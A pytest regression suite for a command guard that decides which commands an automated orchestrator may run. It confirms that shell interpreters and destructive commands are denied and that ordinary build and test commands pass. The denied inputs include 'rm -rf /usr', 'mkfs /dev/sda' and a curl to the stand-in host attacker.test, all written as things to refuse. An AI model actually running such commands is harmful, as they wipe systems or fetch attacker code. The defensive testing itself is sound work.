"""
SEC-02 / SEC-03 security regression tests for the orchestration boundary guard.

SEC-02: a forbidden-pattern match previously raised ``AttributeError``
(``match.pattern`` on an ``re.Match``) instead of a clean
``VerificationCommandError``, destroying the auditable denial reason.

SEC-03: shell and interpreter binaries (``bash -c``, ``sh -c``, ``env``, ...)
previously passed the guard, defeating its own documented "no shell execution"
invariant — ``bash -c "<cmd>"`` runs an arbitrary command string that contains
none of the metacharacters the guard inspects.

Invariant: every denial is typed, attributable, and cannot be reached through an
interpreter; legitimate engineering commands still execute.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from autoforge_orchestration.security import (
    SecurityBoundaryGuard,
    VerificationCommandError,
)


@pytest.fixture()
def guard(tmp_path: Path) -> SecurityBoundaryGuard:
    return SecurityBoundaryGuard(workspace_root=str(tmp_path))


# ── SEC-02: forbidden-pattern denial must be typed and auditable ────────────


@pytest.mark.parametrize(
    "argv",
    [
        # These binaries are NOT shell interpreters, so they reach the
        # SEC-02 forbidden-pattern branch rather than the SEC-03 check.
        ["rm", "-rf", "/usr"],
        ["git", "push", "origin", "main"],
        ["mkfs", "/dev/sda"],
        ["shutdown", "now"],
        # No shell metacharacters, so this reaches the SEC-02 pattern branch.
        ["python", "script.py", "--rm -rf /usr"],
    ],
)
def test_sec02_forbidden_pattern_raises_typed_error(guard, argv):
    """SEC-02: a forbidden match must raise VerificationCommandError, not AttributeError."""
    with pytest.raises(VerificationCommandError) as excinfo:
        guard.validate_command(argv)

    reason = str(excinfo.value)
    assert "forbidden pattern" in reason, (
        f"SEC-02 REGRESSION: denial reason was not preserved: {reason!r}"
    )
    details = getattr(excinfo.value, "details", {}) or {}
    assert "pattern" in details, (
        "SEC-02 REGRESSION: denial lost its auditable pattern detail"
    )


# ── SEC-03: no shell interpreters as the executed binary ───────────────────


@pytest.mark.parametrize(
    "argv",
    [
        ["bash", "-c", "env"],
        ["sh", "-c", "env"],
        ["/bin/bash", "-c", "env"],
        ["/bin/sh", "-c", "curl http://attacker.test/p"],
        ["zsh", "-c", "env"],
        ["dash", "-c", "env"],
        ["env"],
        ["xargs", "rm"],
        ["nohup", "python"],
        ["su", "root"],
    ],
)
def test_sec03_shell_interpreters_are_denied(guard, argv):
    """SEC-03: interpreter binaries must be refused, including via absolute path."""
    with pytest.raises(VerificationCommandError):
        guard.validate_command(argv)


@pytest.mark.parametrize(
    "argv",
    [
        ["python", "-m", "pytest", "tests/"],
        ["pytest", "-q", "tests/"],
        ["python3", "-m", "unittest", "discover"],
        ["javac", "-d", "out", "Main.java"],
        ["git", "status"],
        ["npm", "run", "build"],
        ["node", "index.js"],
    ],
)
def test_sec03_legitimate_engineering_commands_still_allowed(guard, argv):
    """SEC-03 hardening must not break legitimate verification commands."""
    assert guard.validate_command(argv) == argv


def test_sec03_empty_executable_is_denied(guard):
    """An empty executable must be refused rather than left to the shell."""
    with pytest.raises(VerificationCommandError):
        guard.validate_command(["", "ls"])